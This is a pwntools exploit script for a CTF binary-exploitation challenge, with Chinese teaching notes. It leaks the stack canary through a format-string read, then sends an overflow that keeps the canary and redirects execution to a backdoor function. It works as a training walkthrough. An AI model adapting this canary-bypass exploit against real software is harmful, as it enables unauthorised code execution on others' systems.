from pwn import *

#context(arch = 'amd64', os = 'linux', log_level = 'debug')
context(arch = 'i386', os = 'linux', log_level = 'debug')

io = remote('pwn.challenge.ctf.show', 28237)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# backdoor = 0x8048586：backdoor函数的地址
backdoor = 0x8048586

# 等待提示信息
io.recvuntil("Look me & use me!")

# 构造格式化字符串，泄露canary值
payload = b'%15$8x'
io.sendline(payload)

# 接收canary值
io.recv()
canary = int(io.recv(8), 16)
print('canary: ' + hex(canary))

# 构造payload，包含canary和backdoor地址
# b'a' * 32：填充到canary位置
# p32(canary)：覆盖canary值
# b'a' * 0xc：填充到返回地址位置
# p32(backdoor)：覆盖返回地址为backdoor函数地址
payload = b'a' * 32 + p32(canary) + b'a' * 0xc + p32(backdoor)
io.sendline(payload)
io.interactive()

"""
【知识点讲解】
1. 题目类型：canary bypass + fmtstr - 格式化字符串泄露canary
2. 核心原理：
   - 利用格式化字符串漏洞泄露canary值
   - 然后构造包含正确canary的payload，绕过保护
3. 关键步骤：
   - 构造格式化字符串 `%15$8x` 读取canary值
   - 解析canary值为整数
   - 构造包含canary的payload，覆盖返回地址为backdoor
4. 执行流程：
   - 第一次发送：格式化字符串泄露canary
   - 第二次发送：构造包含canary的payload，执行backdoor
5. 技术要点：
   - 格式化字符串漏洞的利用
   - Canary保护机制的绕过
   - 精确计算偏移量和填充长度
"""
